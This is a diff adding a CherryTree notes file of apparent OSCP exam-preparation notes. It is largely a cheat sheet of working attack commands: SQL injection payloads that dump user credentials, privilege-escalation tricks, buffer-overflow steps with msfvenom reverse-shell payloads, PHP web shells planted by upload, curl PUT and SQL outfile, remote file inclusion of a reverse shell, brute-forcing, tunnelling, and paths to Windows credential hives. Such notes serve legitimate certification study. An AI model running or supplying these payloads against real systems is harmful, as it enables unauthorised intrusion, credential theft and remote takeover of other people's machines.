@@ -1,0 +1,496 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="OSCP Preparation" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1626779872" ts_lastsave="1636224252">
+    <rich_text>    </rich_text>
+    <rich_text scale="h1">OSCP </rich_text>
+    <rich_text>
+General Notes
+
+
+</rich_text>
+    <rich_text scale="h3" weight="heavy">SQL Injection</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3" weight="heavy">Enumeration Payloads</rich_text>
+    <rich_text>
+
+Enumerate columns
+</rich_text>
+    <rich_text scale="h3">' OR '1'='1' ORDER BY 5#</rich_text>
+    <rich_text>
+
+‘ OR ’1'='1' UNION SELECT 1,2,3,4,5...#
+
+</rich_text>
+    <rich_text weight="heavy">Enumerate Databases </rich_text>
+    <rich_text>
+' union select concat(schema_name),2,3,4,5,6 from information_schema.schemata#
+ 
+</rich_text>
+    <rich_text weight="heavy">Enumerating table names from information_schema</rich_text>
+    <rich_text>
+' union select 1,2,3,table_name,5,6 from information_schema.tables#
+</rich_text>
+    <rich_text weight="heavy">Specifying Database</rich_text>
+    <rich_text>
+' union select 1,2,3,table_name,5,6 from information_schema.tables where table_schema="Staff"#
+
+</rich_text>
+    <rich_text weight="heavy">Enumerating column names from information_schema</rich_text>
+    <rich_text>
+' union select 1,2,3,column_name,5,6 from information_schema.columns#
+
+</rich_text>
+    <rich_text weight="heavy">Dumping </rich_text>
+    <rich_text style="italic" weight="heavy">Columns</rich_text>
+    <rich_text weight="heavy"> from </rich_text>
+    <rich_text style="italic" weight="heavy">Users</rich_text>
+    <rich_text weight="heavy"> Table</rich_text>
+    <rich_text>
+'union select 1,2,3,Username,Password,6 from Users#
+
+</rich_text>
+    <rich_text weight="heavy">Enumerate Table names from a specific database</rich_text>
+    <rich_text>
+' union select concat(table_name),2,3,4,5,6 from information_schema.tables where table_schema"users"# 
+
+</rich_text>
+    <rich_text weight="heavy">Enumerate Column names from a specific database and table</rich_text>
+    <rich_text>
+' union select column_name,2,3,4,5,6 from information_schema.columns where table_name"UserDetails"#
+ 
+</rich_text>
+    <rich_text weight="heavy">Dumping username and password from USERS table and USERDETAILS column</rich_text>
+    <rich_text>
+' union SELECT group_concat(Username,":",Password),2,3,4,5,6 FROM users.UserDetails-- ;
+
+
+</rich_text>
+    <rich_text weight="heavy">OpenDocMan 1.2.7 Manual SQLi</rich_text>
+    <rich_text>
+
+ajax_udf.php?q=1&amp;add_value=odm_user UNION SELECT 1,(database()),3,4,5,6,7,8,9
+
+ajax_udf.php?q=1&amp;add_value=odm_user UNION SELECT 1,table_name,3,4,5,6,7,8,9 from information_schema.tables where table_schema=database()
+
+ 
+ 
+</rich_text>
+    <rich_text scale="h3" weight="heavy"> Useful commands</rich_text>
+    <rich_text>
+•  database()
+•  user()
+•  version()
+
+
+</rich_text>
+    <rich_text scale="h3" weight="heavy">Directory Scanning</rich_text>
+    <rich_text>
+
+• Scan for files with extensions [ex: dirb &lt;HOST&gt; -X .php]
+
+
+</rich_text>
+    <rich_text scale="h2" weight="heavy">Fuzzing</rich_text>
+    <rich_text>
+
+• Fuzz for params [wfuzz -c -w &lt;WORDLIST&gt; --hc 404 &lt;HOST?FUZZ=example.txt&gt;]
+• Fuzz for files and extensions
+
+
+</rich_text>
+    <rich_text scale="h2" weight="heavy">Privilege Escalation
+</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="h2" weight="heavy">Linux
+</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text weight="heavy">Good for guidance</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text link="webs https://tryhackme.com/room/linuxprivescarena">https://tryhackme.com/room/linuxprivescarena</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text link="webs https://tryhackme.com/room/windows10privesc">https://tryhackme.com/room/windows10privesc</rich_text>
+    <rich_text>
+
+Ubuntu 12 = DirtyCow!
+FreeBSD 9.0 = 2 exploits
+
+• sudo -l
+• Kernel Version [uname -r]
+• Sudo Version [sudo -V]
+• find / -perm -u=s -type f 2&gt;/dev/null
+• id might have something
+• look for /opt and /var files
+• pay attention to script files which are importing modules, maybe you can modify the modules and trigger a shell
+• use semicolons to separate commands
+• when analyzing binaries, look for commands without absolute paths (cat instead of /usr/bin/cat), maybe you can export the path and create a file to execute instead of the command
+• when attacking freebsd, always compile the exploits inside the bsd, otherwise it shall not compile and you'll think it's broken
+• if you have cp SUID or something, generate a new user on local machine and upload it, then you can replace the original file
+• pspy and ps aux may have something
+
+Files &amp; Directories
+• /etc/crontab
+• cron.d
+cron.daily
+cron.hourly
+cron.monthly
+cron.weekly
+
+• /var/*
+• /root
+
+</rich_text>
+    <rich_text weight="heavy">Run commands with MySQL as root</rich_text>
+    <rich_text>
+
+select sys_exec('chmod 777 -R /root');
+
+
+</rich_text>
+    <rich_text weight="heavy">Link a command to another</rich_text>
+    <rich_text>
+
+ln -s /bin/sh ps
+</rich_text>
+    <rich_text style="italic">This links the command ps to /bin/sh in order to privesc</rich_text>
+    <rich_text>
+
+/usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
+
+</rich_text>
+    <rich_text weight="heavy">nmap from 2.02 to 5.21 has interactive mode</rich_text>
+    <rich_text>
+
+nmap --interactive
+nmap&gt; !sh
+
+
+
+
+</rich_text>
+    <rich_text scale="h2" weight="heavy">Buffer Overflow</rich_text>
+    <rich_text>
+
+bad = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+
+
+
+</rich_text>
+    <rich_text scale="h3">Spiking</rich_text>
+    <rich_text>
+# trun.spk 
+s_readline(); 
+s_string("TRUN "); 
+s_string_variable("0;) 
+
+generic_send_tcp &lt;HOST&gt; &lt;PORT&gt; trun.spk 0 0
+
+</rich_text>
+    <rich_text scale="h3">Generate pattern:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text justification="center" family="monospace" style="italic" background="#ffffffffffff" foreground="#000000000000">/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 1000</rich_text>
+    <rich_text>
+
+
+</rich_text>
+    <rich_text scale="h3">Get the offset:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text justification="center" style="italic" background="#ffffffffffff" foreground="#000000000000">/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l 1000 -q </rich_text>
+    <rich_text style="italic" background="#ffffffffffff" foreground="#000000000000">&lt;ACCESS VIOLATION&gt;</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text justification="center" style="italic" background="#ffffffffffff" foreground="#000000000000">!mona findmsp</rich_text>
+    <rich_text>
+
+• The manual way is to send bytes and overwrite EIP. Use A's and B's in order to diferentiate
+</rich_text>
+    <rich_text style="italic">• To reach EIP you increase 4 bytes after the Offset.</rich_text>
+    <rich_text>
+
+
+</rich_text>
+    <rich_text scale="h3">0x03 Fuzz for badchars.</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text justification="center" style="italic" background="#ffffffffffff" foreground="#000000000000">buffer = "A" * &lt;OFFSET&gt; + "BBBB" + bad</rich_text>
+    <rich_text>
+
+
+</rich_text>
+    <rich_text scale="h3">0x04 Identify the Return Address:</rich_text>
+    <rich_text>
+
+• Look for JMP ESP on the binary or a DLL without ASLR
+
+</rich_text>
+    <rich_text scale="h3">0x05 </rich_text>
+    <rich_text>Generate ShellCode
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.8.80.34 LPORT=4444 -b '\x00\x07\x2e\xa0' EXITFUNC=thread -f python -v payload</rich_text>
+    <rich_text justification="center" style="italic">
+
+</rich_text>
+    <rich_text justification="center" style="italic" background="#ffffffffffff" foreground="#000000000000">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.102 LPORT=4444 EXITFUNC=thread -b "\x00" -f c</rich_text>
+    <rich_text justification="center" style="italic"> </rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">Tips</rich_text>
+    <rich_text>
+• strings command
+
+
+
+
+
+
+</rich_text>
+    <rich_text scale="h2" weight="heavy">WordPress</rich_text>
+    <rich_text>
+
+WPScan Brute-force:
+
+wpscan --url &lt;TARGET&gt; -U &lt;USER&gt; -P /usr/share/wordlists/rockyou.txt
+
+Agressive Enumeration:
+
+wpscan --url http://symfonos.local/h3l105/ -e ap,at,tt,cb,dbe,u1-20,m --plugins-detection aggressive
+
+
+</rich_text>
+    <rich_text scale="h2" weight="heavy">General Enumeration</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text weight="heavy">SMB</rich_text>
+    <rich_text>
+nmap -sC --script=smb-enum-users 192.168.201.14
+
+</rich_text>
+    <rich_text weight="heavy">POP3</rich_text>
+    <rich_text>
+
+user &lt;user&gt;
+pass &lt;pass&gt;
+list
+retr &lt;email id&gt;
+
+
+</rich_text>
+    <rich_text weight="heavy">Send files</rich_text>
+    <rich_text>
+
+smbmap -H 192.168.201.17 -u david -p qwertyuioplkjhgfdsazxcvbnm --upload /home/xcatolin/rev.php secured\\rev.php
+
+
+</rich_text>
+    <rich_text weight="heavy">Connect and enumerate databases</rich_text>
+    <rich_text>
+
+mysql -h 192.168.201.11 -u root -p
+
+
+</rich_text>
+    <rich_text weight="heavy">Ping Sweep</rich_text>
+    <rich_text>
+
+fping -g -r 1 172.16.37.0/24
+
+
+</rich_text>
+    <rich_text weight="heavy">RPCbind</rich_text>
+    <rich_text>
+
+rpcinfo -p &lt;host&gt;
+
+# showmount -e 192.168.201.8
+Export list for 192.168.201.8:
+/home/vulnix *
+
+mount -t nfs 192.168.201.8:/home /share
+
+
+</rich_text>
+    <rich_text weight="heavy">Crunch</rich_text>
+    <rich_text>
+
+Generating from a specific pattern
+
+crunch 13 13 -t bev,%%@@^1995 -o bigtom
+
+@ lowercase
+, uppercase
+% numbers
+^ special chars
+
+
+</rich_text>
+    <rich_text weight="heavy">Hydra Brute-forcing</rich_text>
+    <rich_text>
+
+• POP3: hydra -L &lt;USER LIST&gt; -P &lt;PASS LIST&gt; -t20 &lt;HOST&gt; -s&lt;PORT&gt; -I pop3
+
+hydra -l admin -P pass.txt 192.168.71.129 http-post-form "/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login Failed"
+
+</rich_text>
+    <rich_text weight="heavy">Brute-forcing Subdomains</rich_text>
+    <rich_text>
+wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "</rich_text>
+    <rich_text link="webs http://cmess.thm/">http://cmess.thm/</rich_text>
+    <rich_text>" -H "Host: FUZZ.cmess.thm" --hw 290
+</rich_text>
+    <rich_text weight="heavy">
+Brute-force a single param</rich_text>
+    <rich_text>
+hydra -l "" -P /usr/share/dirb/wordlists/big.txt 192.168.174.10 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^&amp;Login=Login:invalid key" -f
+
+
+</rich_text>
+    <rich_text weight="heavy">MSSQL enum</rich_text>
+    <rich_text>
+
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=fooadmin,mssql.password=fooadmin,ms-sql-xp-cmdshell.cmd="whoami" 172.16.64.199
+
+
+</rich_text>
+    <rich_text weight="heavy">Modifying values on MySQL</rich_text>
+    <rich_text>
+
+update users set adm="yes" where username="tracking1";
+
+
+</rich_text>
+    <rich_text scale="h2" weight="heavy">General Exploitation</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text weight="heavy">LFI</rich_text>
+    <rich_text>
+
+Tomcat
+/etc/tomcat7/tomcat-users.xml
+
+FreeBSD
+/usr/local/etc/apacheX/httpd.conf
+
+</rich_text>
+    <rich_text weight="heavy">RFI</rich_text>
+    <rich_text>
+python3 -m http.server
+endpoint.php?param=http://localhost:8000/rev.php
+
+
+</rich_text>
+    <rich_text weight="heavy">File Upload with cURL PUT</rich_text>
+    <rich_text>
+
+curl -vX PUT -d '&lt;?php system($_GET["cmd"]);?&gt;' </rich_text>
+    <rich_text link="webs http://192.168.201.7/test/xcatolin.php">http://192.168.201.7/test/xcatolin.php</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text weight="heavy">PTY Spawning</rich_text>
+    <rich_text>
+/usr/bin/script -qc /bin/bash /dev/null
+
+stty raw -echo
+
+
+phpmyadmin command injection
+
+SELECT "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "/var/www/html/wordpress/shell.php"
+
+
+</rich_text>
+    <rich_text weight="heavy">PHP Command Injection/Execution</rich_text>
+    <rich_text>
+
+echo "&lt;pre&gt;";system("ls -la /var/www");echo"&lt;\pre&gt;";
+
+
+
+</rich_text>
+    <rich_text weight="heavy">Pivoting &amp; Port Forwarding</rich_text>
+    <rich_text>
+
+curl --proxy http://192.168.1.45:31337 127.0.0.1:8080
+
+socks5 127.0.0.1 8080 &gt;&gt; /etc/proxychains4
+
+ssh -L 8080:localhost:8080 aeolus@192.168.56.124
+
+</rich_text>
+    <rich_text style="italic">ncat -l -v -p 2222 -c 'ncat 172.16.50.222 22'</rich_text>
+    <rich_text>
+
+
+</rich_text>
+    <rich_text weight="heavy">SSH (22) through Squid Proxy (3128)</rich_text>
+    <rich_text>
+proxytunnel -p 192.168.201.9:3128 -d 127.0.0.1:22 -a 1234
+
+there was a squid proxy running on 3128 and a filtered SSH on 22, so that command basically tunnels to 3128 -&gt; 22 -&gt; 1234 on localhost
+
+then ssh user@127.0.0.1 -p 1234
+
+
+
+</rich_text>
+    <rich_text weight="heavy">Tunneling with Chisel</rich_text>
+    <rich_text>
+
+On local machine;
+chisel server -p 8001 --reverse
+
+On foothold attacked machine;
+./chisel client lhost:8001 R:8000:127.0.0.1:8000
+
+8000 é a porta que tava aberta só pra localhost no alvo, e 8001 é a porta que ficou escutando na minha máquina.
+
+remote:8000 -&gt; local:8001 -&gt; local:8000
+
+ 
+</rich_text>
+    <rich_text weight="heavy">File Upload Bypass Magic Bytes</rich_text>
+    <rich_text>
+That makes so that the file header is a jpeg, the extension a gif and the content of php
+ 
+ echo 'FFD8FFEo' | xxd -r -p &gt; xca.gif
+ echo '&lt;?php $c=$_GET['c']; echo `$c`; ?&gt;' &gt;&gt; xca.gif
+
+
+
+
+
+</rich_text>
+    <rich_text scale="h3" weight="heavy">Windows</rich_text>
+    <rich_text>
+C:/Windows/System32/Config/SAM
+C:/Windows/System32/Config/SYSTEM
+Those are locked while system is running.
+
+C:/Windows/System32/config/RegBack - This is accessible through LFI and stuff.
+
+
+</rich_text>
+    <rich_text family="monospace" scale="h3" background="#ffffffffffff" foreground="#000000000000">General Post-exploitation</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text weight="heavy">Escape rbash with SSH:</rich_text>
+    <rich_text>
+
+ssh mindy@192.168.201.19 -t "bash --noprofile"</rich_text>
+  </node>
+</cherrytree>
